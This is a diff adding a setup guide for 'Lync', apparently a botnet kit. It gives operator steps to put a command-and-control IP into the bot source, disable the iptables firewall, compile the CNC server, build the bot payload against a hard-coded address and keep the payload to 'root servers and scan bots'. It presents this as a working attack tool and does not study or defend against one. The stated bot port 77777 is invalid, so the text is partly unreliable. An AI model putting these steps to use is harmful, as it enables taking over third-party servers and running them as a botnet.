@@ -1,0 +1,33 @@
+Everything You Need:
+
+1. VPS CentOS 6.X. or CentOS 7
+2. MobaXterm And PuTTY.
+3. Another CentOS VPS In The Future For Scanning Bots.
+
+Edit the Lync_Bot.c file and find where it says "SERVERIP" and change it to your server IP.
+
+Edit the Lync_Login.txt file and replace where it says "USERNAME PASSWORD" to your user and pass.
+
+Edit where it says "[SERVERIP]" below to your server IP.   *Make sure you also replace the brackets.
+
+Drag all files into your server and run these commands...
+--------------------------------------------------------------------
+yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+
+service httpd restart; service iptables stop
+
+gcc Lync_CNC.c -o Lync -pthread
+
+python Lync_Build.py Lync_Bot.c 198.199.70.21
+
+screen ./Lync 77777 1 6666
+--------------------------------------------------------------------
+Now press ctrl-A+D   *If screen doesnt work then type "pkill screen" then try to screen again.
+
+Copy your payload and save it somewhere safe so you can root servers and scan bots in the future.
+
+Bot port is 77777, CNC port is 6666 and the connection type is RAW.
+
+Type "screen -x" to see Lync activity.
+
+Make sure to check the Lync_Logs.log file that will appear in your server to see all user logs.
